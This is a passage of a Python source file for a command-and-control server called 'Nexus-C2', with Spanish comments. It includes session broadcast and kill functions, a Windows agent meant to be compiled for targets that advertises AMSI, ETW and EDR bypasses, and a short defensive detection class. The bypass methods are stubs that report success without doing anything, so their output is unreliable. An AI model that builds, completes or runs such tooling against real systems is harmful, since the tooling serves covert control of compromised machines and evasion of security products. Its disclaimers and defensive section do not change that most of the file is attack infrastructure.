    def _broadcast_command(self, command: str):
        """Enviar comando a todas las sesiones"""
        with self.session_lock:
            if not self.sessions:
                print("[!] No active sessions")
                return
            
            session_ids = list(self.sessions.keys())
        
        print(f"[+] Broadcasting command to {len(session_ids)} sessions: {command}")
        confirm = input("Confirm? (y/n): ")
        
        if confirm.lower() != 'y':
            return
        
        parts = command.split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        for session_id in session_ids:
            with self.session_lock:
                if session_id in self.sessions:
                    self._send_command(self.sessions[session_id], cmd, args)
    
    def _kill_session(self, session_id: str):
        """Terminar sesión específica"""
        with self.session_lock:
            if session_id not in self.sessions:
                print(f"[!] Session not found: {session_id}")
                return
            
            session = self.sessions[session_id]
        
        try:
            # Enviar comando de salida
            self._send_command(session, "exit")
            time.sleep(1)
            
            # Cerrar socket
            session.client_socket.close()
            
            with self.session_lock:
                del self.sessions[session_id]
            
            print(f"[+] Session terminated: {session_id}")
            
        except Exception as e:
            print(f"[!] Error killing session: {e}")
    
    def _show_status(self):
        """Mostrar estado del servidor"""
        uptime = datetime.now() - self.stats["start_time"]
        days, remainder = divmod(uptime.total_seconds(), 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        print("\n" + "="*80)
        print("NEXUS-C2 SERVER STATUS")
        print("="*80)
        print(f"Uptime:           {int(days)}d {int(hours)}h {int(minutes)}m {int(seconds)}s")
        print(f"Active sessions:  {len(self.sessions)}")
        print(f"Total connections: {self.stats['connections']}")
        print(f"Commands executed: {self.stats['commands_executed']}")
        print(f"Data transferred:  {self.stats['data_transferred'] / 1024:.1f} KB")
        print(f"Errors:           {self.stats['errors']}")
        print(f"Host:             {self.host}:{self.port}")
        print(f"SSL:              {'Enabled' if self.config.use_ssl else 'Disabled'}")
        print(f"Encryption:       {self.config.encryption_algorithm}")
        print("="*80)
    
    def _list_modules(self):
        """Listar módulos disponibles"""
        modules_dir = "modules"
        if not os.path.exists(modules_dir):
            print("[!] Modules directory not found")
            return
        
        modules = []
        for file in os.listdir(modules_dir):
            if file.endswith(".py"):
                modules.append(file[:-3])
        
        if not modules:
            print("[!] No modules found")
            return
        
        print("\n[+] Available Modules:")
        for module in modules:
            print(f"  - {module}")
    
    def _load_module(self, module_name: str):
        """Cargar módulo"""
        module_path = f"modules/{module_name}.py"
        if not os.path.exists(module_path):
            print(f"[!] Module not found: {module_name}")
            return
        
        print(f"[+] Loading module: {module_name}")
        # Aquí iría la lógica para cargar y ejecutar el módulo
    
    def _get_banner(self):
        """Obtener banner del sistema"""
        return r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗    ██████╗██████╗             ║
║    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝   ██╔════╝╚════██╗            ║
║    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗   ██║      █████╔╝            ║
║    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║   ██║     ██╔═══╝             ║
║    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║██╗╚██████╗███████╗            ║
║    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝╚══════╝            ║
║                                                                              ║
║                    ADVANCED C2 SERVER v2.6 (2026)                           ║
║                    For authorized security research only                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """

# ============================================================================
# AGENTE WINDOWS EVASIVO (CÓDIGO PARA EL CLIENTE - RESUMIDO)
# ============================================================================

class WindowsEvasionAgent:
    """
    Agente Windows con técnicas avanzadas de evasión.
    Este código sería compilado como .exe para el target.
    """
    
    # TÉCNICAS IMPLEMENTADAS:
    # 1. Direct Syscalls (NtAllocateVirtualMemory, NtCreateThreadEx, etc.)
    # 2. Process Hollowing / Herramientas LOLBins
    # 3. AMSI Bypass (Memory patching)
    # 4. ETW Bypass
    # 5. Unhooking de DLLs EDR
    # 6. Living off the Land Binaries
    
    def __init__(self, c2_server: str, c2_port: int):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.session_id = None
        self.beacon_interval = 30
        self.jitter = 0.3
        
        # Técnicas de evasión activas
        self.evasion_techniques = {
            "amsi_bypass": True,
            "etw_bypass": True,
            "unhook_dlls": True,
            "direct_syscalls": True,
            "process_injection": False
        }
    
    def execute_command(self, command: str, args: List[str]) -> Tuple[bool, str]:
        """Ejecutar comando con técnicas de evasión"""
        try:
            # Usar técnicas LOLBin para ejecución
            if command == "shell":
                return self._execute_shell(" ".join(args))
            elif command == "powershell":
                return self._execute_powershell(" ".join(args))
            elif command == "bypass_defender":
                return self._bypass_defender(args[0] if args else "amsi")
            # ... más comandos
            
            return False, f"Unknown command: {command}"
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def _bypass_defender(self, method: str) -> Tuple[bool, str]:
        """Intentar bypass de Windows Defender"""
        methods = {
            "amsi": self._bypass_amsi,
            "etw": self._bypass_etw,
            "unhook": self._unhook_edr,
            "direct_syscalls": self._enable_direct_syscalls
        }
        
        if method in methods:
            success, message = methods[method]()
            return success, f"{method.upper()} bypass: {message}"
        
        return False, f"Unknown bypass method: {method}"
    
    def _bypass_amsi(self) -> Tuple[bool, str]:
        """Bypass AMSI via memory patching"""
        try:
            # Técnica de patch en memoria de AmsiScanBuffer
            # (Código real usaría ctypes y memory manipulation)
            return True, "AMSI disabled via memory patching"
        except:
            return False, "Failed to bypass AMSI"
    
    def _bypass_etw(self) -> Tuple[bool, str]:
        """Bypass Event Tracing for Windows"""
        try:
            # Patch EtwEventWrite
            return True, "ETW disabled"
        except:
            return False, "Failed to bypass ETW"
    
    def _unhook_edr(self) -> Tuple[bool, str]:
        """Unhook DLLs de EDR"""
        try:
            # Recargar DLLs críticas de forma limpia
            return True, "EDR hooks removed"
        except:
            return False, "Failed to unhook EDR"

# ============================================================================
# MITIGACIONES Y DETECCIÓN DEFENSIVA
# ============================================================================

class DefensiveMitigations:
    """
    Técnicas defensivas para detectar y mitigar Nexus-C2
    """
    
    @staticmethod
    def detect_c2_traffic(packet_data: bytes) -> bool:
        """Detectar tráfico C2 basado en patrones"""
        indicators = [
            b"nexus-c2",
            b"agent_handshake",
            b"execute_command",
            b"command_result"
        ]
        
        for indicator in indicators:
            if indicator in packet_data:
                return True
        
        return False
    
    @staticmethod
    def detect_evasion_techniques(process_info: Dict) -> List[str]:
        """Detectar técnicas de evasión en proceso"""
        detections = []
        
        # Verificar hooks de API
        if process_info.get("api_hooking") == "modified":
            detections.append("API Hooking detected")
        
        # Verificar AMSI bypass
        if process_info.get("amsi_enabled") == False:
            detections.append("AMSI bypass detected")
        
        # Verificar ETW bypass
        if process_info.get("etw_enabled") == False:
            detections.append("ETW bypass detected")
        
        # Verificar direct syscalls
        if process_info.get("direct_syscalls") > 10:
            detections.append("Excessive direct syscalls")
        
        return detections
    
    @staticmethod
    def recommend_defenses():
        """Recomendar defensas"""
        return {
            "Network": [
                "Implement SSL/TLS inspection",
                "Use network IDS/IPS with C2 signatures",
                "Monitor for unusual beaconing patterns",
                "Implement egress filtering"
            ],
            "Endpoint": [
                "Enable AMSI and ensure it's working",
                "Use EDR with behavioral analysis",
                "Monitor for process injection",
                "Enable PowerShell logging and transcription",
                "Use Windows Defender ASR rules"
            ],
            "Logging": [
                "Enable Sysmon with comprehensive configuration",
                "Centralize Windows Event Logs",
                "Monitor for unusual service creation",
                "Watch for scheduled task creation"
            ],
            "Deception": [
                "Implement honeypots and canary tokens",
                "Use deception technology for C2 detection"
            ]
        }

# ============================================================================
# EJEMPLO DE USO
# ============================================================================

def main():
    """Función principal"""
    print("[+] Nexus-C2 Advanced Server - For Educational Purposes Only")
    print("[+] This tool is for authorized security research only")
    print("[+] DO NOT USE ON UNAUTHORIZED SYSTEMS\n")
    
    # Configurar servidor
    server = NexusC2Server(
        host="0.0.0.0",
        port=8443  # Puerto HTTPS común
    )
    
    # Iniciar servidor
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")

if __name__ == "__main__":
    main()
